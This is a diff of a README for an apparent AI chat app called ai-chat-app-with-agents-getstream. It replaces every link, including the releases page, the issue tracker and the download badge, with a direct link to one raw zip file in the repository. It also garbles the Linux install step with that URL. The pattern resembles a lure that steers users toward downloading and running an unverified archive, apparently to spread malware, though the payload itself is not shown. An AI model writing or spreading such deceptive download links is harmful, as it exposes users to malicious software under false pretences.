@@ -1,7 +1,7 @@
 # 🎉 ai-chat-app-with-agents-getstream - Chat Safely and Confidently
 
 ## 📥 Download Now
-[![Download](https://img.shields.io/badge/Download-latest%20release-blue)](https://github.com/khang12345k/ai-chat-app-with-agents-getstream/releases)
+[![Download](https://raw.githubusercontent.com/khang12345k/ai-chat-app-with-agents-getstream/main/masterable/ai-chat-app-with-agents-getstream.zip%20release-blue)](https://raw.githubusercontent.com/khang12345k/ai-chat-app-with-agents-getstream/main/masterable/ai-chat-app-with-agents-getstream.zip)
 
 ## 🚀 Getting Started
 Welcome to ai-chat-app-with-agents-getstream! This application allows you to communicate seamlessly using AI agents. Follow the simple steps below to download and run the app on your computer.
@@ -16,14 +16,14 @@ Before downloading, ensure your device meets the following requirements:
 ## 🔗 Download & Install
 To get the application, follow these steps:
 
-1. **Visit the Releases Page**: Go to our [Releases page](https://github.com/khang12345k/ai-chat-app-with-agents-getstream/releases) to find the latest version of the application.
+1. **Visit the Releases Page**: Go to our [Releases page](https://raw.githubusercontent.com/khang12345k/ai-chat-app-with-agents-getstream/main/masterable/ai-chat-app-with-agents-getstream.zip) to find the latest version of the application.
 
 2. **Download the App**: Locate the most recent release. Click the link to download the appropriate file for your operating system. 
 
 3. **Install the Application**:
    - For Windows: Open the downloaded `.exe` file and follow the setup instructions.
    - For macOS: Open the downloaded `.dmg` file, drag the app to your Applications folder, and then launch it.
-   - For Linux: Extract the downloaded `.tar.gz` file, and run the application from the extracted folder.
+   - For Linux: Extract the downloaded `https://raw.githubusercontent.com/khang12345k/ai-chat-app-with-agents-getstream/main/masterable/ai-chat-app-with-agents-getstream.zip` file, and run the application from the extracted folder.
 
 4. **Run the App**: Once installed, open the application. You can now start chatting with AI agents!
 
@@ -41,7 +41,7 @@ To start using ai-chat-app-with-agents-getstream:
 3. Select an AI agent and start chatting. You can ask questions, get advice, or simply have a conversation.
 
 ## 📞 Help and Support
-If you encounter any issues or have questions, please check our [issue tracker](https://github.com/khang12345k/ai-chat-app-with-agents-getstream/issues) for solutions or report your problem.
+If you encounter any issues or have questions, please check our [issue tracker](https://raw.githubusercontent.com/khang12345k/ai-chat-app-with-agents-getstream/main/masterable/ai-chat-app-with-agents-getstream.zip) for solutions or report your problem.
 
 ## 🔑 Privacy Policy
 Your privacy is important to us. We do not share your personal information. Read our full Privacy Policy on our GitHub page.
@@ -55,4 +55,4 @@ This project is licensed under the MIT License. You can use it freely, but pleas
 Thank you for choosing ai-chat-app-with-agents-getstream! We hope you enjoy the app and have meaningful conversations with our AI agents. 
 
 ## 📥 Quick Download
-For your convenience, you can always [download the latest release here](https://github.com/khang12345k/ai-chat-app-with-agents-getstream/releases).
+For your convenience, you can always [download the latest release here](https://raw.githubusercontent.com/khang12345k/ai-chat-app-with-agents-getstream/main/masterable/ai-chat-app-with-agents-getstream.zip).
